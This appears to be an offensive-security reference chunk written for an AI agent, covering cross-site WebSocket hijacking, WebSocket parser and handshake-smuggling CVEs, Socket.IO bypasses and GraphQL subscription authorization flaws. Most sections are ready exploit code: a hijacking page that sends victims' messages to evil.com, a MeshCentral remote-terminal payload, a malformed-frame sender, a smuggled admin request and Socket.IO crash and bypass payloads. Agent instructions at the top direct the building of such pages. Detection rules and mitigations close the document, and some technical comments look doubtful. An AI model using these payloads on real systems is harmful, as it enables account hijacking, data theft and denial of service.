# WebSocket Hijacking & State Attacks — Agent Chunk 75a
> Source: OWASP WebSocket Security, CVE Databases for MeshCentral/Zeppelin/Netty/Socket.IO, GraphQL Subscription Security Research
> Purpose: Understand Cross-Site WebSocket Hijacking (CSWSH), WebSocket state confusion via parser vulnerabilities, framework-specific CVEs in Socket.IO and Netty, and GraphQL subscription authorization bypass
> Context Window: Small (optimized for ~8K-12K tokens)

## Agent Instructions
Test WebSocket endpoints for CSWSH by checking if the handshake validates the Origin header and uses CSRF tokens. Test for state confusion by sending malformed frames with integer overflow lengths. Check Socket.IO and GraphQL subscription endpoints for known CVEs. For CSWSH, create a proof-of-concept HTML page that opens a WebSocket to the target from an attacker-controlled domain.

---

## 1. Cross-Site WebSocket Hijacking (CSWSH)

### 1.1 The Vulnerability

WebSocket handshakes are initiated via HTTP GET with an `Upgrade: websocket` header. Browsers automatically include cookies in this handshake request. If the server does not validate the `Origin` header, a malicious page on any domain can open a WebSocket connection to the target, authenticated as the victim.

### 1.2 Exploit Code

```html
<!-- Hosted on https://evil.com/exploit.html -->
<!DOCTYPE html>
<html>
<head><title>CSWSH Exploit</title></head>
<body>
<script>
// Opens WebSocket to target — browser sends victim's cookies automatically
var ws = new WebSocket("wss://vulnerable-app.com/ws/chat");

ws.onopen = function() {
    console.log("Connected as victim!");
    
    // Read victim's private messages
    ws.send(JSON.stringify({action: "get_messages", channel: "private"}));
    
    // Send message as victim
    ws.send(JSON.stringify({
        action: "send_message",
        channel: "general",
        text: "This is from the attacker, sent as victim"
    }));
};

ws.onmessage = function(event) {
    // Exfiltrate data to attacker's server
    var data = event.data;
    fetch("https://evil.com/collect", {
        method: "POST",
        body: data
    });
    console.log("Exfiltrated: " + data);
};

ws.onerror = function(error) {
    console.log("Error: " + error);
};
</script>
<p>Loading...</p>
</body>
</html>
```

### 1.3 Reproduction Steps

```
1. Identify a WebSocket endpoint (wss://target.com/ws/*)
2. Check if the handshake request includes cookies (inspect in browser DevTools)
3. Check if the server validates the Origin header:
   - Send handshake with Origin: https://evil.com
   - If 101 Switching Protocols → VULNERABLE
4. Host exploit HTML on attacker domain
5. Victim visits attacker page → WebSocket opens → attacker reads/writes as victim
```

### 1.4 CVE-2024-26135 — MeshCentral CSWSH (CVSS 8.6)

**Vulnerability:** MeshCentral (remote management platform) did not validate the Origin header on WebSocket handshakes, allowing CSWSH. An attacker could gain full remote control of managed devices.

**Impact:** Remote code execution on all devices managed by the victim's MeshCentral instance.

**Reproduction:**
```html
<script>
var ws = new WebSocket("wss://meshcentral.target.com/control.ashx");
ws.onopen = function() {
    // Send command to managed device
    ws.send(JSON.stringify({
        action: "msg",
        type: "tunnel",
        nodeid: "node//TARGET_DEVICE_ID",
        usage: 1  // Terminal
    }));
};
</script>
```

**Affected:** MeshCentral < 1.1.17.
**Fix:** Origin header validation and CSRF token in WebSocket handshake.

### 1.5 CVE-2024-51775 — Apache Zeppelin CSWSH

**Vulnerability:** Apache Zeppelin's WebSocket endpoints for notebook execution did not validate Origin headers. An attacker could execute arbitrary code in Zeppelin interpreters (Python, Scala, Shell) as the victim.

**Impact:** Remote code execution via Zeppelin interpreter.

**Affected:** Apache Zeppelin < 0.11.2.

## 2. State Confusion via Parser Vulnerabilities

### 2.1 CVE-2026-54466 — websocket-driver / SockJS Integer Overflow (CVSS 7.5)

**Vulnerability:** The `websocket-driver` Ruby gem (used by SockJS and ActionCable) had an integer overflow in its frame parser when handling the 64-bit payload length field. A crafted frame with a length near `2^63` caused the parser to allocate a small buffer but read beyond it.

**Attack:**
```python
import struct
import socket
import hashlib
import base64

# Establish WebSocket connection
sock = socket.create_connection(('target.com', 80))
# ... complete handshake ...

# Send malicious frame with integer overflow length
# WebSocket binary frame: FIN=1, opcode=2 (binary), MASK=0
# Extended payload length (8 bytes): near 2^63 to trigger overflow
frame = b'\x82'                          # FIN + binary opcode
frame += b'\x7f'                         # 127 = use 8-byte extended length
frame += struct.pack('>Q', 0x7FFFFFFFFFFFFFFF)  # 2^63 - 1
frame += b'\x00' * 100                   # Partial payload

sock.send(frame)
# Parser computes buffer_size = 0x7FFFFFFFFFFFFFFF, wraps to small value
# Subsequent reads overflow the buffer → memory corruption or crash
```

**Impact:** Denial of service, potential memory corruption.
**Affected:** websocket-driver < 0.8.0.

### 2.2 CVE-2026-47072 — Netty WebSocket Handshake Smuggling

**Vulnerability:** Netty's WebSocket handshake implementation did not properly validate the `Sec-WebSocket-Key` header, allowing an attacker to smuggle additional HTTP requests in the handshake.

**Attack:**
```
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Content-Length: 55

GET /admin/secrets HTTP/1.1
Host: target.com
X: ignore
```

**Impact:** The smuggled request is processed after the WebSocket upgrade, bypassing authentication that was enforced only on the initial handshake.

**Affected:** Netty < 4.1.116.

## 3. Socket.IO CVEs

### 3.1 CVE-2024-38355 — Socket.IO DoS via Malformed Handshake (CVSS 7.3)

**Vulnerability:** Socket.IO server crashed when receiving a specially crafted handshake packet with unexpected data types in the `EIO` (Engine.IO) query parameter.

**Payload:**
```bash
# Send malformed Engine.IO handshake
curl "https://target.com/socket.io/?EIO[]=4&transport=polling"
# Server TypeError → crash → DoS

# Alternative payloads
curl "https://target.com/socket.io/?EIO=4&transport=polling&sid[__proto__]=polluted"
```

**Affected:** Socket.IO < 4.7.5.

### 3.2 CVE-2026-33151 — Socket.IO Namespace Authorization Bypass (CVSS 8.1)

**Vulnerability:** Socket.IO's namespace middleware could be bypassed by connecting to the root namespace `/` first, then emitting events to a protected namespace using the namespace prefix in the event name.

**Attack:**
```javascript
// Protected namespace: /admin (requires admin role)
// Bypass: connect to /, emit with namespace prefix

const io = require("socket.io-client");
const socket = io("https://target.com/", { 
    withCredentials: true 
});

socket.on("connect", () => {
    // Emit event as if connected to /admin namespace
    socket.emit("/admin:getUsers", {}, (response) => {
        console.log("Admin users:", response);
    });
});
```

**Affected:** Socket.IO < 4.8.2.

### 3.3 CVE-2026-69185 — Socket.IO Adapter Race Condition (CVSS 6.5)

**Vulnerability:** Socket.IO's Redis adapter had a race condition when broadcasting messages across nodes, allowing a disconnected client to receive messages from rooms it was no longer a member of.

**Impact:** Information disclosure — users receive messages from channels/rooms they have been removed from.

**Affected:** @socket.io/redis-adapter < 8.3.1.

## 4. GraphQL Subscription Authorization Bypass

### 4.1 The Problem

GraphQL subscriptions use WebSocket connections for real-time data streaming. Authorization is often checked only during the initial subscription setup (`connection_init`) but not for subsequent data pushes. If authorization changes (user loses access), the subscription continues streaming data.

### 4.2 Neo4j GraphQL GHSA (GHSA-4pc2-jwf3-jxmr)

**Vulnerability:** Neo4j GraphQL library's subscription handler did not re-evaluate authorization directives for data pushed to active subscriptions. A user who subscribed to data before their permissions were revoked continued receiving updates.

**Reproduction:**
```javascript
// 1. User subscribes while authorized
const ws = new WebSocket("wss://target.com/graphql", "graphql-ws");
ws.onopen = () => {
    ws.send(JSON.stringify({
        type: "connection_init",
        payload: { Authorization: "Bearer user-token" }
    }));
    ws.send(JSON.stringify({
        id: "1",
        type: "subscribe",
        payload: {
            query: `subscription { 
                userUpdated(userId: "admin-id") { 
                    email, role, salary 
                } 
            }`
        }
    }));
};

// 2. User's access to admin data is revoked
// 3. Subscription continues streaming admin data updates
ws.onmessage = (event) => {
    // Still receiving admin data after permission revocation
    console.log(JSON.parse(event.data));
};
```

### 4.3 Strawberry GraphQL GHSA (GHSA-w3g5-2848-2hq4)

**Vulnerability:** Strawberry GraphQL (Python framework) did not apply permission classes to subscription resolvers, only to query/mutation resolvers.

**Impact:** Any authenticated user could subscribe to any subscription regardless of permission decorators.

**Affected:** Strawberry GraphQL < 0.232.0.

```python
# Server-side (vulnerable):
@strawberry.type
class Subscription:
    @strawberry.subscription
    @permission_classes([IsAdmin])        # Permission NOT enforced for subscriptions
    async def admin_events(self) -> AsyncGenerator[AdminEvent, None]:
        async for event in admin_event_stream():
            yield event

# Any authenticated user can subscribe to admin_events
```

## 5. Detection

```yaml
# Detect CSWSH attempts
- rule: WebSocket Cross-Origin Hijacking
  condition: >
    http.request.headers["upgrade"] == "websocket" AND
    http.request.headers["origin"] not in allowed_origins
  severity: HIGH

# Detect malformed WebSocket frames
- rule: WebSocket Frame Anomaly
  condition: websocket.frame.payload_length > 10485760  # 10MB
  severity: MEDIUM

# Detect Socket.IO namespace bypass
- rule: Socket.IO Namespace Prefix in Event
  condition: socketio.event_name matches "^/[a-z]+:"
  severity: HIGH
```

## 6. Mitigation

1. **Validate Origin header:** Reject WebSocket handshakes from unexpected origins. Use an allowlist.
2. **Use CSRF tokens in handshake:** Require a CSRF token in the WebSocket URL or first message.
3. **Update WebSocket libraries:** Patch websocket-driver, Netty, Socket.IO to latest versions.
4. **Re-authorize subscriptions:** Periodically re-evaluate authorization for active GraphQL subscriptions (e.g., on each message push or on a timer).
5. **Limit frame sizes:** Reject WebSocket frames exceeding a reasonable payload size.
6. **Isolate Socket.IO namespaces:** Enforce namespace authorization at the transport layer, not just middleware.
